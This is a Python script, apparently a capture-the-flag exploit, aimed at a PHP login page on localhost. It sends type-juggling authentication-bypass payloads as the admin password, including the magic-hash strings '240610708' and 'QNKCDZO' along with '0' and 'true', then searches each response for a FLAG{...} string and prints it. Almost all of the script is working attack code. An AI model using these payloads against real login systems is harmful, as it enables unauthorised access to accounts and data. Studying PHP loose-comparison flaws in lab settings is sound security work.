#!/usr/bin/env python3
import sys
import time

print("Python Type Juggling Auth Bypass Test")
print(f"Python version: {sys.version}")
print(f"Platform: {sys.platform}\n")

# Test 1: Import check
print("[+] Step 1: Checking imports")
try:
    import requests
    print("    ✓ requests module available")
    print(f"    Version: {requests.__version__}")
except ImportError as e:
    print(f"    ✗ Cannot import requests: {e}")
    sys.exit(1)

# Test 2: Basic connection
print("\n[+] Step 2: Testing basic HTTP connection")
target = "http://127.0.0.1:32907/index.php"
print(f"    Target: {target}")

try:
    print("    Attempting GET request...")
    response = requests.get(target, timeout=15)
    print(f"    ✓ Connection successful")
    print(f"    Status: {response.status_code}")
    print(f"    Length: {len(response.text)} bytes")
    print(f"    Headers: {dict(response.headers)}")
    
    # Test 3: Type juggling payloads
    print("\n[+] Step 3: Testing type juggling payloads")
    
    test_payloads = [
        {"username": "admin", "password": "240610708"},
        {"username": "admin", "password": "QNKCDZO"},
        {"username": "admin", "password": "0"},
        {"username": "admin", "password": "true"},
    ]
    
    for i, payload in enumerate(test_payloads, 1):
        print(f"\n    Test {i}: username='{payload['username']}', password='{payload['password']}'")
        try:
            resp = requests.post(target, data=payload, timeout=15)
            print(f"    Status: {resp.status_code} | Length: {len(resp.text)}B")
            
            if "FLAG{" in resp.text:
                print(f"    [!] FLAG FOUND!")
                import re
                flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
                for flag in flags:
                    print(f"    {flag}")
                print(f"\n    Full response:\n{resp.text}")
            else:
                print(f"    No flag found")
                
        except Exception as e:
            print(f"    ✗ Error on test {i}: {type(e).__name__}: {e}")
    
except requests.exceptions.ConnectionError as e:
    print(f"    ✗ Connection error: {e}")
    print(f"    The target service may be down or unreachable")
except requests.exceptions.Timeout as e:
    print(f"    ✗ Timeout: {e}")
except Exception as e:
    print(f"    ✗ Unexpected error: {type(e).__name__}: {e}")
    import traceback
    traceback.print_exc()

print("\n[+] Test complete")

